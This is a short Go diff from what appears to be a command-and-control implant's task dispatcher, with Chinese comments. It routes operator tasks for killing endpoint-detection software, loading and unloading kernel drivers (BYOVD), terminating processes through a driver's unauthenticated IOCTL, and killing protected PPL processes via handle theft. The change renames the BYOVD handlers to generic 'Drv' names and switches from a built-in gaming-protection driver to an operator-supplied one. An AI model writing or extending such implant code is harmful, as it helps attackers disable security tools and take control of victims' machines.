@@ -1672,13 +1672,13 @@ func executeTask(task Task) Result {
 		output, exitCode, errMsg = handleEDRKill(task.Data)
 	case "byovd_load":
 		// BYOVD：加载内核驱动（操作员提供 .sys）
-		output, exitCode, errMsg = handleBYOVDLoad(task.Data)
+		output, exitCode, errMsg = handleDrvLoad(task.Data)
 	case "byovd_unload":
 		// BYOVD：卸载驱动
-		output, exitCode, errMsg = handleBYOVDUnload(task.Data)
+		output, exitCode, errMsg = handleDrvUnload(task.Data)
 	case "byovd_kill":
-		// BYOVD：用内置 kgameprotect 驱动的无鉴权终止 IOCTL 击杀进程（按 PID 或进程名）
-		output, exitCode, errMsg = handleBYOVDKill(task.Data)
+		// 驱动击杀：用操作员自备驱动的终止 IOCTL 击杀进程（按 PID 或进程名）
+		output, exitCode, errMsg = handleDrvKill(task.Data)
 	case "ppl_kill":
 		// PPL 击杀：直接终止失败后走句柄窃取（内置驱动无内核读写，不能改 EPROCESS.Protection）
 		output, exitCode, errMsg = handlePPLKill(task.Data)
